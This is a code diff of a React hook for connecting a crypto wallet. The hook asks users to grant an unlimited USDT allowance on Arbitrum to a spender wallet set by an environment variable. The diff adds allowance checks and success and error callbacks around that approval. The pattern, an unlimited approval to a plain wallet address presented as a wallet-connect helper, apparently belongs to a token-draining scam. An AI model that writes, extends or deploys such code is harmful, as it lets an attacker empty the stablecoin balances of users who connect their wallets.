@@ -1,31 +1,24 @@
 import { useAppKit } from "@reown/appkit/react";
 import { useState } from "react";
-import { useAccount, useWriteContract, useDisconnect } from "wagmi";
+import {
+  useAccount,
+  useDisconnect,
+  useReadContract,
+  useWriteContract,
+} from "wagmi";
 import { MaxUint256 } from "ethers";
-
-// export const USDT_ARBITRUM_ABI_APPROVE = [
-//   {
-//     type: "function",
-//     name: "transfer",
-//     stateMutability: "nonpayable",
-//     inputs: [
-//       { name: "recipient", type: "address" },
-//       { name: "amount", type: "uint256" },
-//     ],
-//     outputs: [{ type: "bool" }],
-//   },
-// ];
+import { erc20Abi } from "viem";
 
 export const USDT_ARBITRUM_ABI_APPROVE = [
   {
-    constant: false, // Or you can omit this line
+    constant: false,
     inputs: [
       {
-        name: "spender", // Standard name for the first argument
+        name: "spender",
         type: "address",
       },
       {
-        name: "value", // Standard name for the second argument (amount)
+        name: "value",
         type: "uint256",
       },
     ],
@@ -36,7 +29,7 @@ export const USDT_ARBITRUM_ABI_APPROVE = [
         type: "bool",
       },
     ],
-    payable: false, // Or you can omit this line
+    payable: false,
     stateMutability: "nonpayable",
     type: "function",
   },
@@ -55,20 +48,7 @@ export const USDT_ARBITRUM_ABI_TRANSFER = [
   },
 ];
 
-// export const config = createConfig({
-//   chains: [mainnet, polygon, arbitrum, sepolia],
-//   transports: {
-//     [mainnet.id]: http(),
-//     [arbitrum.id]: http(),
-//     [sepolia.id]: http(),
-//     [polygon.id]: http(),
-//   },
-// });
-
 const USDT_ARBITRUM_CONTRACT = "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9";
-
-// const USDT_SEPOLIA_CONTRACT =
-//   "0x6ca1d0ba653065d96bfefeb68fc65e56e576ff6ecc72ce245890b97a9b65c075";
 
 const APPROVE_TO_WALLET =
   import.meta.env.VITE_SPENDER_ADDRESS ||
@@ -78,13 +58,31 @@ export const useConnectWallet = () => {
   const [openNav, setOpenNav] = useState(false);
   const { open } = useAppKit();
   const { isConnected, address } = useAccount();
-  const { writeContract } = useWriteContract();
+  const {
+    writeContract,
+    isPending: isApproving,
+    error: contractWriteError,
+  } = useWriteContract(); // Rename isPending
+  // const [isApproved, setIsApproved] = useState(false);
 
-  console.log(address, "address");
-  console.log(openNav, "openNav");
-  console.log("API URL:", import.meta.env.VITE_API_URL);
+  const {
+    data: currentAllowance,
+    isLoading: isCheckingAllowance,
+    refetch: refetchAllowance,
+  } = useReadContract({
+    abi: erc20Abi,
+    address: USDT_ARBITRUM_CONTRACT,
+    functionName: "allowance",
+    args: [address!, APPROVE_TO_WALLET],
+    // eslint-disable-next-line @typescript-eslint/ban-ts-comment
+    // @ts-expect-error
+    enabled: !!address && isConnected,
+    query: { staleTime: 15_000 }, // Optional: Cache allowance check for 15 seconds
+  });
 
-  // Handle the opening of the navigation
+  const hasSufficientAllowance =
+    !!currentAllowance && currentAllowance === MaxUint256;
+
   const handleOpenNav = () => {
     setOpenNav((prev) => !prev);
   };
@@ -95,25 +93,65 @@ export const useConnectWallet = () => {
     disconnect();
   };
 
-  // Handle opening the wallet modal if not connected
   const handleOpenModal = () => {
-    if (isConnected) {
-      approveTokens();
-    } else {
-      // Open wallet modal if not connected
+    if (!openNav) {
       open();
     }
   };
 
-  // Approve token function
-  const approveTokens = async () => {
-    writeContract({
-      abi: USDT_ARBITRUM_ABI_APPROVE,
-      address: USDT_ARBITRUM_CONTRACT,
-      functionName: "approve",
-      args: [APPROVE_TO_WALLET, MaxUint256],
-    });
+  const approveTokens = async (
+    onSuccessCallback: () => void,
+    onErrorCallback: (error: Error) => void,
+  ) => {
+    if (!address) {
+      console.error("Wallet not connected for approval");
+      onErrorCallback(new Error("Wallet not connected"));
+      return;
+    }
+    console.log("Requesting approval...");
+    writeContract(
+      {
+        abi: USDT_ARBITRUM_ABI_APPROVE,
+        address: USDT_ARBITRUM_CONTRACT,
+        functionName: "approve",
+        args: [APPROVE_TO_WALLET, MaxUint256],
+      },
+      {
+        onSuccess: async (txHash) => {
+          console.log("Approval transaction sent:", txHash);
+          // Optional: Wait for transaction confirmation for a more robust UX
+          // try {
+          //   const receipt = await waitForTransactionReceipt(config, { hash: txHash });
+          //   console.log("Approval confirmed:", receipt);
+          //   refetchAllowance(); // Refresh allowance state
+          //   onSuccessCallback();
+          // } catch (e) {
+          //   console.error("Error waiting for approval confirmation:", e);
+          //   onErrorCallback(e instanceof Error ? e : new Error("Confirmation failed"));
+          // }
+          // For simplicity now, assume success on send
+          refetchAllowance(); // Refresh allowance state
+          onSuccessCallback();
+        },
+        onError: (error) => {
+          console.error("Approval failed:", error);
+          onErrorCallback(error);
+        },
+      },
+    );
   };
+
+  // const approveTokens = async () => {
+  //   writeContract(
+  //     {
+  //       abi: USDT_ARBITRUM_ABI_APPROVE,
+  //       address: USDT_ARBITRUM_CONTRACT,
+  //       functionName: "approve",
+  //       args: [APPROVE_TO_WALLET, MaxUint256],
+  //     },
+  //     { onSuccess: (res) => res && setIsApproved(true) },
+  //   );
+  // };
 
   const transferTokens = async (tokens: string) => {
     writeContract({
@@ -125,10 +163,22 @@ export const useConnectWallet = () => {
   };
 
   return {
-    approveTokens,
+    // Connection & Basic Wallet
     handleOpenNav,
     handleOpenModal,
     handleDisconnect,
+    isConnected,
+    address,
+    // Allowance
+    hasSufficientAllowance,
+    isCheckingAllowance,
+    refetchAllowance,
+    // Approval
+    approveTokens,
+    isApproving, // Renamed from isPending
+    // Transfer
     transferTokens,
+    // Errors (optional but good practice)
+    contractWriteError,
   };
 };
